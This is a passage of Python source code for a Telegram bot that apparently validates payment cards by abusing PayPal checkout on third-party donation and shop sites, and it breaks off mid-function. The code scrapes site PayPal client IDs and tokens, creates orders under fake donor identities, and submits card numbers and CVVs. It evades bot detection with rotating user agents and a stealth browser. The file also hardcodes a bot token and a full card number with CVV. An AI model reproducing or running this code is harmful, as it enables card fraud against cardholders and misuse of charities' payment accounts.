# ============================================================
# SECTION 1: Imports & Config
# ============================================================
import os
import re
import gc
import sys
import json
import time
import base64
import random
import logging
import threading
import asyncio
from urllib.parse import urlparse

import requests
import urllib3
import telebot
from telebot import types

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# ---- .env loading ----
try:
    from dotenv import load_dotenv
    load_dotenv()
except ImportError:
    pass

BOT_TOKEN = os.getenv('BOT_TOKEN', '8407490230:AAGIDHEYTwvNomiBas_yk4ezIalvweFAQro')
OWNER_ID = int(os.getenv('OWNER_ID', '6843321125'))
TEST_CARD = os.getenv('TEST_CARD', '4059986126444431|11|30|947')
ADMINS = [str(OWNER_ID)]

if not BOT_TOKEN:
    raise SystemExit("❌ BOT_TOKEN missing. Set it in .env file.")

# ---- logging ----
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s [%(levelname)s] %(name)s: %(message)s',
    handlers=[
        logging.FileHandler('bot.log', encoding='utf-8'),
        logging.StreamHandler(sys.stdout),
    ]
)
log = logging.getLogger('bot')

# ---- UserAgent ----
try:
    from fake_useragent import UserAgent
    _UA = UserAgent()
    HAS_FAKE_UA = True
except Exception:
    HAS_FAKE_UA = False
    class _SimpleUA:
        _agents = [
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1',
        ]
        @property
        def random(self):
            return random.choice(self._agents)
    _UA = _SimpleUA()

def random_ua():
    try:
        return _UA.random
    except Exception:
        return 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'

# ---- Bot ----
bot = telebot.TeleBot(BOT_TOKEN, parse_mode='HTML')

# ---- Global states ----
processing_status = {}
error_counter = {'429': 0, '502': 0, '500': 0, 'timeout': 0, 'connection': 0}

# ---- Constants ----
PAYPAL_RESPONSES = [
    'Payer cannot pay', 'INSUFFICIENT_FUNDS', 'ORDER_NOT_APPROVED',
    'TRANSACTION_REFUSED', 'PAYER_ACTION_REQUIRED', 'INSTRUMENT_DECLINED',
    'CARD_DECLINED', 'PAYMENT_DENIED', 'PAYER_CANNOT_PAY',
    'EXPIRED_CARD', 'INVALID_PAYMENT_METHOD', 'DO_NOT_HONOR',
    'ACCOUNT_CLOSED', 'LOST_OR_STOLEN', 'CVV2_FAILURE',
    'SUSPECTED_FRAUD', 'INVALID_ACCOUNT', 'REATTEMPT_NOT_PERMITTED',
    'ACCOUNT_BLOCKED_BY_ISSUER', 'GENERIC_DECLINE', 'TRANSACTION_NOT_PERMITTED',
    'INVALID_TRANSACTION', 'RESTRICTED_OR_INACTIVE_ACCOUNT',
    'SECURITY_VIOLATION', 'INVALID_OR_RESTRICTED_CARD', 'EXPIRED_CREDIT_CARD',
    'DECLINED_PLEASE_RETRY', 'PAYER_ACCOUNT_LOCKED_OR_CLOSED',
    'DECLINED', 'UNPROCESSABLE_ENTITY', 'VALIDATION_ERROR',
    'INVALID_REQUEST', 'AUTHENTICATION_FAILURE', 'NOT_AUTHORIZED',
    'CARD_TYPE_NOT_SUPPORTED', 'INVALID_CURRENCY', 'AMOUNT_MISMATCH',
    'PAYEE_BLOCKED_TRANSACTION', 'PAYER_BLOCKED_TRANSACTION',
    'PAYEE_ACCOUNT_RESTRICTED', 'PAYER_ACCOUNT_RESTRICTED',
    'UNSUPPORTED_PAYMENT_INSTRUMENT', 'INTERNAL_SERVER_ERROR',
    'SERVICE_UNAVAILABLE', 'RATE_LIMIT_REACHED', 'MALFORMED_REQUEST',
    'UNKNOWN_ERROR',
]

DEAD_RESPONSES = [
    'invalid_client', 'Client Authentication failed', 'invalid_grant',
    'unsupported_grant_type', 'invalid_scope', 'Create Order Failed',
    'Invalid card format', 'No form fields', 'No au', 'No PayPal data',
    'Connection failed', 'Decode error', 'Invalid URL', 'Error:',
    'UserAgent', 'ImportError', 'Expecting value', 'INVALID_GATEWAY',
    'EMPTY_RESPONSE',
]

# ============================================================
# SECTION 2: Telegram Safe Helpers
# ============================================================
def track_error(kind):
    if kind in error_counter:
        error_counter[kind] += 1
        if error_counter[kind] > 10:
            log.warning(f'Too many {kind} errors, sleeping 60s')
            time.sleep(60)
            error_counter[kind] = 0

def reset_errors():
    for k in error_counter:
        error_counter[k] = 0

def _handle_tg_exc(e, op, attempt, retries):
    s = str(e)
    if '429' in s:
        track_error('429')
        try:
            wait = int(s.split('retry after ')[1].split(')')[0])
        except Exception:
            wait = 30
        log.warning(f'⏳ FloodWait ({op}): {wait}s')
        time.sleep(min(wait + 5, 65))
        return True
    if '502' in s or 'Bad Gateway' in s:
        track_error('502')
        wait = 5 * (attempt + 1)
        log.warning(f'⚠️ 502 ({op}) try {attempt+1}/{retries} wait {wait}s')
        time.sleep(wait)
        return True
    if '500' in s or 'Internal Server Error' in s:
        track_error('500')
        wait = 3 * (attempt + 1)
        log.warning(f'⚠️ 500 ({op}) try {attempt+1}/{retries} wait {wait}s')
        time.sleep(wait)
        return True
    if 'Timed out' in s or 'timeout' in s.lower():
        track_error('timeout')
        wait = 2 * (attempt + 1)
        log.warning(f'⚠️ Timeout ({op}) try {attempt+1}/{retries} wait {wait}s')
        time.sleep(wait)
        return True
    if 'Connection' in s:
        track_error('connection')
        wait = 3 * (attempt + 1)
        log.warning(f'⚠️ Connection ({op}) try {attempt+1}/{retries} wait {wait}s')
        time.sleep(wait)
        return True
    log.error(f'❌ Error ({op}): {s[:150]}')
    return False

def safe_edit_message(chat_id, message_id, text, parse_mode='HTML', retries=10):
    for i in range(retries):
        try:
            r = bot.edit_message_text(chat_id=chat_id, message_id=message_id, text=text, parse_mode=parse_mode)
            reset_errors()
            return r
        except Exception as e:
            if not _handle_tg_exc(e, 'edit', i, retries):
                return None
    return None

def safe_send_message(chat_id, text, parse_mode='HTML', retries=10, reply_markup=None):
    for i in range(retries):
        try:
            r = bot.send_message(chat_id, text, parse_mode=parse_mode, reply_markup=reply_markup)
            reset_errors()
            return r
        except Exception as e:
            if not _handle_tg_exc(e, 'send', i, retries):
                return None
    return None

def safe_send_document(chat_id, file_path, caption='', parse_mode='HTML', retries=10):
    for i in range(retries):
        try:
            with open(file_path, 'rb') as f:
                r = bot.send_document(chat_id, f, caption=caption, parse_mode=parse_mode)
            reset_errors()
            return r
        except Exception as e:
            if not _handle_tg_exc(e, 'doc', i, retries):
                return None
    return None

def safe_send_photo(chat_id, file_path, caption='', parse_mode='HTML', retries=10):
    for i in range(retries):
        try:
            with open(file_path, 'rb') as f:
                r = bot.send_photo(chat_id, f, caption=caption, parse_mode=parse_mode)
            reset_errors()
            return r
        except Exception as e:
            if not _handle_tg_exc(e, 'photo', i, retries):
                return None
    return None

def safe_get_file(file_id, retries=10):
    for i in range(retries):
        try:
            r = bot.get_file(file_id)
            reset_errors()
            return r
        except Exception as e:
            if not _handle_tg_exc(e, 'get_file', i, retries):
                return None
    return None

def safe_download_file(file_path, retries=10):
    for i in range(retries):
        try:
            r = bot.download_file(file_path)
            reset_errors()
            return r
        except Exception as e:
            if not _handle_tg_exc(e, 'download', i, retries):
                return None
    return None

# ============================================================
# SECTION 3: Extraction Utilities
# ============================================================
def extract_client_id(html):
    if not html:
        return None
    patterns = [
        r'client-id=["\']([^"\']+)["\']',
        r'client_id["\']?\s*[:=]\s*["\']([^"\']+)["\']',
        r'data-client-id=["\']([^"\']+)["\']',
        r'clientId["\']?\s*[:=]\s*["\']([A-Za-z0-9_-]{20,})["\']',
        r'paypal_client_id["\']?\s*[:=]\s*["\']([^"\']+)["\']',
        r'PAYPAL_CLIENT_ID["\']?\s*[:=]\s*["\']([^"\']+)["\']',
        r'"clientId"\s*:\s*"([^"]+)"',
        r'client_id\s*=\s*["\']([^"\']+)["\']',
        r'merchant-id=["\']([^"\']+)["\']',
        r'data-merchant-id=["\']([^"\']+)["\']',
        r'"merchant_id"\s*:\s*"([^"]+)"',
        r'data-paypal-client-id=["\']([^"\']+)["\']',
        r'paypal-client-id=["\']([^"\']+)["\']',
        r'data-paypal-commerce-client-id=["\']([^"\']+)["\']',
        r'data-ppcp-client-id=["\']([^"\']+)["\']',
    ]
    for p in patterns:
        m = re.search(p, html, re.IGNORECASE)
        if m:
            return m.group(1)
    for script in re.findall(r'<script[^>]*>(.*?)</script>', html, re.DOTALL):
        for p in patterns:
            m = re.search(p, script, re.IGNORECASE)
            if m:
                return m.group(1)
    for s in re.findall(r'["\']([A-Za-z0-9_-]{80,})["\']', html):
        if s.startswith(('A', 'B', 'E')):
            return s
    return None

def extract_all_tokens(html):
    if not html:
        return None, None
    for p in [
        r'data-client-token=["\']([^"\']+)["\']',
        r'"data-client-token"\s*:\s*"([^"]+)"',
        r'client-token=["\']([^"\']+)["\']',
        r'client_token=["\']([^"\']+)["\']',
        r'clientToken=["\']([^"\']+)["\']',
        r'"clientToken"\s*:\s*"([^"]+)"',
    ]:
        m = re.search(p, html, re.IGNORECASE)
        if m:
            enc = m.group(1)
            try:
                padded = enc + '=' * (-len(enc) % 4)
                decoded = base64.b64decode(padded).decode('utf-8', errors='ignore')
                tm = re.search(r'"accessToken":"([^"]+)"', decoded)
                if tm:
                    return tm.group(1), enc
            except Exception:
                pass
            return None, enc
    for p in [
        r'accessToken["\']?\s*:\s*["\']([^"\']+)["\']',
        r'"accessToken"\s*:\s*"([^"]+)"',
        r'access_token["\']?\s*:\s*["\']([^"\']+)["\']',
        r'"access_token"\s*:\s*"([^"]+)"',
        r'accessToken=([^&\s"\']+)',
    ]:
        m = re.search(p, html, re.IGNORECASE)
        if m:
            return m.group(1), None
    return None, None

def extract_form_data(html):
    fd = {}
    if not html:
        return fd
    m = re.search(r'<form[^>]*id=["\']give-form[^"\']*["\'][^>]*>(.*?)</form>', html, re.DOTALL)
    scope = m.group(1) if m else html
    for name, value in re.findall(
        r'<input[^>]*type=["\']hidden["\'][^>]*name=["\']([^"\']+)["\'][^>]*value=["\']([^"\']*)["\']',
        scope
    ):
        fd[name] = value
    for attr, val in re.findall(r'data-([\w-]+)=["\']([^"\']+)["\']', scope):
        if any(k in attr.lower() for k in ['give-', 'paypal', 'ppcp']):
            fd[attr] = val
    BAD = ('forminator', 'mailpoet', 'elementor', 'nonce-life', 'wpcf7', 'ninja', 'gravity')
    for k in list(fd.keys()):
        if any(b in k.lower() for b in BAD):
            del fd[k]
    return fd

def extract_ajax_url(html, url_netloc):
    if not html:
        return None
    if 'admin-ajax.php' in html:
        return f'https://{url_netloc}/wp-admin/admin-ajax.php'
    if 'wc-ajax' in html:
        return f'https://{url_netloc}/?wc-ajax=checkout'
    return None

def extract_minimum_amount(html):
    if not html:
        return '1.00'
    patterns = [
        r'minimum donation amount of \$([\d.]+)',
        r'minimum donation amount[^\d]*([\d.]+)',
        r'data-min-amount=["\']([\d.]+)["\']',
        r'data-minimum-amount=["\']([\d.]+)["\']',
        r'min-amount=["\']([\d.]+)["\']',
        r'name="give-form-minimum"[^>]*value="([^"]+)"',
        r'data-give-form-minimum="([^"]+)"',
    ]
    for p in patterns:
        m = re.search(p, html, re.IGNORECASE)
        if m:
            try:
                float(m.group(1))
                return m.group(1)
            except Exception:
                continue
    return '1.00'

def detect_gateway_type(html):
    if not html:
        return None
    h = html.lower()

    m = re.search(r'name=["\']give-gateway["\'][^>]*value=["\']([^"\']+)["\']', html)
    if m:
        gw = m.group(1).lower()
        if gw in ('offline', 'stripe', 'stripe_payment_element', 'manual', 'check', 'bank'):
            return None
        if gw in ('paypal-commerce', 'paypal_commerce', 'ppcp'):
            return 'paypal-commerce'
        if gw in ('paypal_standard', 'paypal-standard'):
            return 'paypal_standard'
        if gw in ('paypal_donations', 'paypal-donations'):
            return 'paypal_donations'
        if gw in ('paypal_express', 'paypal-express'):
            return 'paypal_express'
        if 'paypal' in gw:
            return gw

    has_client_id = bool(re.search(r'client-id=["\']([A-Za-z0-9_-]{20,})["\']', html))
    has_sdk = 'paypal.com/sdk/js' in h

    if has_client_id or has_sdk:
        if 'ppcp' in h or 'woocommerce_paypal_payments' in h:
            return 'ppcp'
        if 'give_paypal_commerce' in h or 'givewp' in h:
            return 'paypal-commerce'
        if 'woocommerce' in h:
            return 'ppcp'
        return 'paypal-commerce'

    if 'paypal_standard' in h or 'paypal-standard' in h:
        return 'paypal_standard'
    if 'paypal_donations' in h or 'paypal-donations' in h:
        return 'paypal_donations'
    if 'paypal_express' in h or 'paypal-express' in h:
        return 'paypal_express'

    return None

# ============================================================
# SECTION 4: PayPalCommerce (requests engine)
# ============================================================
FIRST_NAMES = ["James", "John", "Robert", "Michael", "William", "David", "Richard", "Joseph", "Thomas", "Charles", "Mary", "Patricia", "Jennifer", "Linda", "Elizabeth", "Barbara", "Susan", "Jessica", "Sarah", "Karen"]
LAST_NAMES = ["Smith", "Johnson", "Williams", "Brown", "Jones", "Garcia", "Miller", "Davis", "Rodriguez", "Martinez", "Wilson", "Anderson", "Taylor", "Thomas", "Moore", "Jackson", "Martin", "Lee", "Thompson", "White"]

class PayPalCommerce:
    def __init__(self, target_url=None, prefetched=None):
        self.donation = '1.00'
        self.minimum_amount = '1.00'
        self.currency = 'USD'
        self.timeout = 15
        self.r = requests.Session()
        self.r.verify = False
        self.r.headers.update({'Accept': 'application/json', 'Accept-Language': 'en-US,en;q=0.9'})

        self.target_url = target_url or ''
        self.url = urlparse(self.target_url).netloc
        self.inurl = urlparse(self.target_url).path or '/'
        if urlparse(self.target_url).query:
            self.inurl += f'?{urlparse(self.target_url).query}'

        self.client_id = None
        self.access_token = None
        self.client_token = None
        self.form_data = {}
        self.ajax_url = None
        self.cookies = {}
        self.gateway_type = None
        self.is_valid_gateway = True
        self.unsupported_reason = None
        self.email = f'{random.choice(FIRST_NAMES)}{random.randint(100, 999)}@gmail.com'

        if prefetched:
            self._load_prefetched(prefetched)
        else:
            self._init_and_extract()

    def _load_prefetched(self, p):
        self.client_id = p.get('client_id')
        self.access_token = p.get('access_token')
        self.client_token = p.get('client_token')
        self.form_data = p.get('form_data') or {}
        self.ajax_url = p.get('ajax_url')
        self.cookies = p.get('cookies') or {}
        self.gateway_type = p.get('gateway_type')
        self.minimum_amount = p.get('minimum_amount') or '1.00'
        self.is_valid_gateway = p.get('is_valid_gateway', True)
        self.unsupported_reason = p.get('unsupported_reason')

    def _init_and_extract(self):
        try:
            headers = {
                'user-agent': random_ua(),
                'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
                'accept-language': 'en-US,en;q=0.9',
            }
            resp = self.r.get(f'https://{self.url}{self.inurl}', headers=headers, timeout=self.timeout)
            self.cookies = dict(resp.cookies)
            html = resp.text

            gw = detect_gateway_type(html)
            self.gateway_type = gw

            if gw is None:
                self.is_valid_gateway = False
                self.unsupported_reason = 'Not a PayPal gateway'
                return

            if gw in ('paypal_standard', 'paypal_express', 'paypal_donations'):
                self.is_valid_gateway = False
                self.unsupported_reason = f'{gw} (redirect-based, cannot check card)'
                return

            self.client_id = extract_client_id(html)
            at, ct = extract_all_tokens(html)
            self.access_token = at
            self.client_token = ct
            self.form_data = extract_form_data(html)
            self.ajax_url = extract_ajax_url(html, self.url)
            self.minimum_amount = extract_minimum_amount(html)

            if not self.access_token and not self.client_token and self.client_id:
                self._get_access_token()
            if not self.client_token and self.ajax_url:
                self._get_client_token()
        except Exception as e:
            log.warning(f'_init_and_extract failed: {e}')
            self.is_valid_gateway = False
            self.unsupported_reason = f'init error: {e}'

    def _get_access_token(self):
        if not self.client_id or self.access_token:
            return self.access_token
        try:
            auth = base64.b64encode(f'{self.client_id}:'.encode()).decode()
            headers = {
                'authorization': f'Basic {auth}',
                'content-type': 'application/x-www-form-urlencoded',
                'user-agent': random_ua(),
            }
            r = self.r.post('https://api-m.paypal.com/v1/oauth2/token',
                            headers=headers,
                            data={'grant_type': 'client_credentials'},
                            timeout=self.timeout)
            if r.status_code == 200:
                self.access_token = r.json().get('access_token')
                return self.access_token
        except Exception:
            pass
        return None

    def _get_client_token(self):
        if self.client_token or not self.ajax_url:
            return self.client_token
        actions = [
            'give_paypal_commerce_get_client_token',
            'give_paypal_get_client_token',
            'get_client_token',
            'paypal_get_client_token',
            'ppcp_get_client_token',
        ]
        for action in actions:
            try:
                data = {'action': action, 'form-id': self.form_data.get('give-form-id', '')}
                headers = {
                    'user-agent': random_ua(),
                    'x-requested-with': 'XMLHttpRequest',
                    'origin': f'https://{self.url}',
                    'referer': f'https://{self.url}{self.inurl}',
                    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
                }
                r = self.r.post(self.ajax_url, data=data, headers=headers, cookies=self.cookies, timeout=10)
                if r.status_code == 200 and r.text:
                    try:
                        j = r.json()
                    except Exception:
                        continue
                    token = None
                    if isinstance(j.get('data'), dict):
                        token = j['data'].get('client_token') or j['data'].get('token') or j['data'].get('access_token')
                    elif isinstance(j.get('data'), str):
                        token = j['data']
                    elif j.get('client_token'):
                        token = j['client_token']
                    elif j.get('token'):
                        token = j['token']
                    if token:
                        if '.' not in token:
                            try:
                                padded = token + '=' * (-len(token) % 4)
                                dec = base64.b64decode(padded).decode('utf-8', errors='ignore')
                                tm = re.search(r'"accessToken":"([^"]+)"', dec)
                                if tm:
                                    self.client_token = token
                                    self.access_token = tm.group(1)
                                    return self.client_token
                            except Exception:
                                pass
                        self.client_token = token
                        return self.client_token
            except Exception:
                continue
        return None

    def _base_form(self):
        fd = dict(self.form_data)
        fn = random.choice(FIRST_NAMES)
        ln = random.choice(LAST_NAMES)
        fd.update({
            'give-amount': self.minimum_amount, 'give-currency': self.currency, 'currency': self.currency,
            'payment-mode': 'paypal-commerce',
            'give_first': fn, 'give_last': ln, 'first_name': fn, 'last_name': ln,
            'give_email': self.email, 'email': self.email,
            'give-gateway': 'paypal-commerce', 'give_company': '', 'give_comment': '',
            'give_anonymous': '0', 'give_agree_to_terms': '1',
            'give-address1': '123 Main St', 'give-city': 'New York', 'give-state': 'NY',
            'give-zip': '10001', 'give-country': 'US', 'give-phone': '2125551234',
        })
        return fd

    def _amounts(self):
        out = []
        try:
            if float(self.minimum_amount) != 1.0:
                out.append(self.minimum_amount)
        except Exception:
            pass
        out += ['5.00', '10.00', '18.50', '25.00', '36.50', '50.00', '100.00']
        return out

    def _create_order(self):
        if not self.is_valid_gateway:
            return None
        if self.ajax_url:
            oid = self._create_order_ajax()
            if oid:
                return oid
        if self.access_token:
            oid = self._create_order_direct()
            if oid:
                return oid
        if self.client_token:
            oid = self._create_order_with_client_token()
            if oid:
                return oid
        return None

    def _create_order_ajax(self):
        if not self.ajax_url:
            return None
        actions = ['give_paypal_commerce_create_order', 'give_create_order', 'create_order']
        headers = {
            'user-agent': random_ua(),
            'accept': 'application/json, text/javascript, */*; q=0.01',
            'x-requested-with': 'XMLHttpRequest',
            'origin': f'https://{self.url}',
            'referer': f'https://{self.url}{self.inurl}',
            'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
        }
        for amount in self._amounts():
            fd = self._base_form()
            fd['give-amount'] = amount
            fd['amount'] = amount
            for action in actions:
                try:
                    r = self.r.post(self.ajax_url, params={'action': action}, headers=headers,
                                    data=fd, cookies=self.cookies, timeout=self.timeout)
                    if r.status_code == 200 and r.text:
                        try:
                            j = r.json()
                        except Exception:
                            continue
                        if isinstance(j.get('data'), dict) and j['data'].get('id'):
                            return j['data']['id']
                        if isinstance(j.get('data'), str):
                            return j['data']
                        for k in ('id', 'order_id', 'orderID'):
                            if j.get(k):
                                return j[k]
                except Exception:
                    continue
        return None

    def _create_order_direct(self):
        if not self.access_token:
            return None
        try:
            headers = {
                'authorization': f'Bearer {self.access_token}',
                'content-type': 'application/json',
                'user-agent': random_ua(),
                'accept': 'application/json',
            }
            data = {
                'intent': 'CAPTURE',
                'purchase_units': [{'amount': {'currency_code': self.currency, 'value': self.donation}}],
                'application_context': {'shipping_preference': 'NO_SHIPPING', 'user_action': 'PAY_NOW'},
            }
            r = self.r.post('https://api-m.paypal.com/v2/checkout/orders', headers=headers, json=data, timeout=self.timeout)
            if r.status_code in (200, 201):
                return r.json().get('id')
        except Exception:
            pass
        return None

    def _create_order_with_client_token(self):
        if not self.client_token:
            return None
        try:
            headers = {
                'authorization': f'Bearer {self.client_token}',
                'content-type': 'application/json',
                'user-agent': random_ua(),
                'accept': 'application/json',
            }
            data = {
                'intent': 'CAPTURE',
                'purchase_units': [{'amount': {'currency_code': self.currency, 'value': self.donation}}],
            }
            r = self.r.post('https://api-m.paypal.com/v2/checkout/orders', headers=headers, json=data, timeout=self.timeout)
            if r.status_code in (200, 201):
                return r.json().get('id')
        except Exception:
            pass
        return None

    def _approve_order(self, order_id):
        if self.ajax_url and 'admin-ajax' in self.ajax_url:
            r = self._approve_order_ajax(order_id)
            if r:
                return r
        if self.access_token:
            try:
                headers = {
                    'authorization': f'Bearer {self.access_token}',
                    'content-type': 'application/json',
                    'user-agent': random_ua(),
                }
                return self.r.post(
                    f'https://api-m.paypal.com/v2/checkout/orders/{order_id}/capture',
                    headers=headers, timeout=self.timeout)
            except Exception:
                pass
        return None

    def _approve_order_ajax(self, order_id):
        if not self.ajax_url:
            return None
        actions = ['give_paypal_commerce_approve_order', 'give_approve_order', 'approve_order']
        headers = {
            'user-agent': random_ua(),
            'accept': 'application/json, text/javascript, */*; q=0.01',
            'x-requested-with': 'XMLHttpRequest',
            'origin': f'https://{self.url}',
            'referer': f'https://{self.url}{self.inurl}',
            'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
        }
        for amount in self._amounts():
            fd = self._base_form()
            fd['give-amount'] = amount
            fd['amount'] = amount
            for action in actions:
                try:
                    r = self.r.post(self.ajax_url, params={'action': action, 'order': order_id},
                                    headers=headers, data=fd, cookies=self.cookies, timeout=self.timeout)
                    if r.status_code == 200:
                        return r
                except Exception:
                    continue
        return None

    def _clean_response(self, text):
        if not text:
            return 'EMPTY_RESPONSE'
        text_strip = text.strip()
        text_lower = text_strip.lower()

        if text_lower == 'true':
            return 'CHARGE 1.0'

        try:
            j = json.loads(text_strip)
            if isinstance(j, dict) and j.get('success') is True:
                data = j.get('data') or {}
                if isinstance(data, dict):
                    order = data.get('order') or {}
                    if isinstance(order, dict) and str(order.get('status', '')).upper() == 'COMPLETED':
                        return 'CHARGE 1.0'
        except Exception:
            pass

        if 'insufficient' in text_lower:
            return 'INSUFFICIENT_FUNDS'

        up = text_strip.upper()
        for pr in PAYPAL_RESPONSES:
            if pr in up:
                if pr == 'ORDER_NOT_APPROVED':
                    return 'Payer cannot pay for this transaction.'
                return pr

        return f'UNKNOWN: {text_strip[:180]}'

    def Charge(self, ccx):
        try:
            if not self.is_valid_gateway:
                return f'UNSUPPORTED: {self.unsupported_reason or "invalid gateway"}'
            if self.gateway_type in ('paypal_standard', 'paypal_express', 'paypal_donations'):
                return f'UNSUPPORTED: {self.gateway_type} redirect-based'
            if not self.access_token and not self.client_token:
                return 'UNSUPPORTED: no token'

            parts = ccx.strip().split('|')
            if len(parts) < 4:
                return 'Invalid card format'
            n, mm, yy, cvc = parts[0].strip(), parts[1].strip(), parts[2].strip(), parts[3].strip()
            if '20' in yy:
                yy = yy.split('20')[1]
            expiry = f'20{yy}-{mm}'

            order_id = self._create_order()
            if not order_id:
                return 'Create Order Failed'

            tokens = [t for t in (self.client_token, self.access_token, self.client_id) if t]
            confirm_json = {}
            confirm_text = ''

            for tok in tokens:
                headers = {
                    'authorization': f'Bearer {tok}',
                    'paypal-client-metadata-id': self.client_id or '',
                    'user-agent': random_ua(),
                }
                payload = {
                    'payment_source': {'card': {
                        'number': n, 'expiry': expiry, 'security_code': cvc,
                        'attributes': {'verification': {'method': 'SCA_WHEN_REQUIRED'}},
                    }},
                    'application_context': {'vault': False},
                }
                try:
                    r = self.r.post(
                        f'https://cors.api.paypal.com/v2/checkout/orders/{order_id}/confirm-payment-source',
                        headers=headers, json=payload, timeout=self.timeout)
                    confirm_text = r.text
                    if r.status_code == 200:
                        try:
                            confirm_json = r.json()
                        except Exception:
                            confirm_json = {}
                        break
                except Exception:
                    continue

            if isinstance(confirm_json, dict):
                details = confirm_json.get('details') or []
                if details:
                    d = details[0]
                    issue = d.get('issue', '')
                    desc = d.get('description', '')
                    if issue:
                        if issue == 'ORDER_NOT_APPROVED':
                            return 'Payer cannot pay for this transaction.'
                        return f'{issue}: {desc}' if desc else issue
                if confirm_json.get('name'):
                    name = confirm_json['name']
                    if name in PAYPAL_RESPONSES:
                        msg = confirm_json.get('message', '')
                        return f'{name}: {msg}' if msg else name
                if confirm_json.get('message'):
                    return confirm_json['message']

            if confirm_text:
                try:
                    tj = json.loads(confirm_text)
                    if isinstance(tj, dict) and tj.get('details'):
                        d = tj['details'][0]
                        issue = d.get('issue', '')
                        desc = d.get('description', '')
                        if issue:
                            if issue == 'ORDER_NOT_APPROVED':
                                return 'Payer cannot pay for this transaction.'
                            return f'{issue}: {desc}' if desc else issue
                except Exception:
                    pass

            approve = self._approve_order(order_id)
            if approve and approve.text:
                return self._clean_response(approve.text)
            return 'DECLINED'
        except Exception as e:
            return f'Error: {e}'

    def close(self):
        try:
            self.r.close()
        except Exception:
            pass

# ============================================================
# SECTION 5: Playwright Fallback
# ============================================================
async def _pw_extract(url):
    try:
        from playwright.async_api import async_playwright
    except ImportError:
        return None

    try:
        from playwright_stealth import stealth_async
        HAS_STEALTH = True
    except ImportError:
        HAS_STEALTH = False

    captured = {'client_id': None, 'access_token': None, 'client_token': None}

    async def on_response(resp):
        try:
            u = resp.url
            if 'paypal.com/sdk/js' in u and 'client-id=' in u:
                m = re.search(r'client-id=([^&]+)', u)
                if m:
                    captured['client_id'] = m.group(1)
            elif 'api-m.paypal.com/v1/oauth2/token' in u:
                try:
                    j = await resp.json()
                    if j.get('access_token'):
                        captured['access_token'] = j['access_token']
                except Exception:
                    pass
        except Exception:
            pass

    try:
        async with async_playwright() as p:
            browser = await p.chromium.launch(
                headless=True,
                args=['--disable-blink-features=AutomationControlled', '--no-sandbox'],
            )
            ctx = await browser.new_context(
                user_agent=random_ua(),
                viewport={'width': 1366, 'height': 768},
                locale='en-US',
            )
            page = await ctx.new_page()
            if HAS_STEALTH:
                try:
                    await stealth_async(page)
                except Exception:
                    pass
            page.on('response', on_response)
            try:
                await page.goto(url, wait_until='networkidle', timeout=30000)
            except Exception:
                try:
                    await page.goto(url, wait_until='domcontentloaded', timeout=20000)
                except Exception:
                    pass
            html = await page.content()

            result = {
                'client_id': captured['client_id'] or extract_client_id(html),
                'access_token': captured['access_token'],
                'client_token': captured['client_token'],
                'form_data': extract_form_data(html),
                'ajax_url': extract_ajax_url(html, urlparse(url).netloc),
                'gateway_type': detect_gateway_type(html),
                'minimum_amount': extract_minimum_amount(html),
            }
            if not result['access_token'] and not result['client_token']:
                at, ct = extract_all_tokens(html)
                result['access_token'] = at
                result['client_token'] = ct

            await browser.close()
            return result
    except Exception as e:
        log.warning(f'playwright extract failed: {e}')
        return None

def run_playwright_extract(url, timeout=45):
    try:
        loop = asyncio.new_event_loop()
        try:
            return loop.run_until_complete(asyncio.wait_for(_pw_extract(url), timeout=timeout))
        finally:
            loop.close()
    except Exception as e:
        log.warning(f'run_playwright_extract: {e}')
        return None

def take_screenshot(url, path, timeout=25):
    try:
        from playwright.sync_api import sync_playwright
        with sync_playwright() as p:
            browser = p.chromium.launch(
                headless=True,
                args=['--no-sandbox', '--disable-blink-features=AutomationControlled'],
            )
            ctx = browser.new_context(
                user_agent=random_ua(),
                viewport={'width': 1366, 'height': 768},
                locale='en-US',
            )
            page = ctx.new_page()
            try:
                page.goto(url, wait_until='domcontentloaded', timeout=timeout * 1000)
                page.wait_for_timeout(2500)
            except Exception:
                pass
            page.screenshot(path=path, full_page=False)
            browser.close()
        return True
    except Exception as e:
        log.warning(f'screenshot failed for {url}: {e}')
        return False

# ============================================================
# SECTION 6: Hybrid Engine + Check
# ============================================================
def _sufficient(data):
    if not data:
        return False
    return bool(data.get('client_id')) and bool(data.get('access_token') or data.get('client_token'))

def hybrid_fetch(url):
    eng = PayPalCommerce(target_url=url)
    base = {
        'client_id': eng.client_id,
        'access_token': eng.access_token,
        'client_token': eng.client_token,
        'form_data': eng.form_data,
        'ajax_url': eng.ajax_url,
        'cookies': eng.cookies,
        'gateway_type': eng.gateway_type,
        'minimum_amount': eng.minimum_amount,
        'is_valid_gateway': eng.is_valid_gateway,
        'unsupported_reason': eng.unsupported_reason,
        'engine': 'requests',
    }
    eng.close()

    if not base['is_valid_gateway']:
        return base

    if _sufficient(base):
        return base

    log.info(f'requests insufficient for {url}, trying playwright')
    pw = run_playwright_extract(url)
    if pw:
        for k in ('client_id', 'access_token', 'client_token', 'form_data', 'ajax_url', 'gateway_type', 'minimum_amount'):
            if pw.get(k):
                base[k] = pw[k]
        base['engine'] = 'playwright'
    return base

def check_single_link(link):
    try:
        if not link.startswith(('http://', 'https://')):
            return {'link': link, 'status': 'invalid', 'reason': 'Invalid URL format'}

        prefetched = hybrid_fetch(link)
        gw = prefetched.get('gateway_type')

        if not prefetched.get('is_valid_gateway', True):
            return {
                'link': link, 'status': 'dead',
                'reason': prefetched.get('unsupported_reason') or f'Gateway: {gw or "unknown"}',
                'gateway_type': gw,
            }

        if gw in ('paypal_standard', 'paypal_express', 'paypal_donations'):
            return {
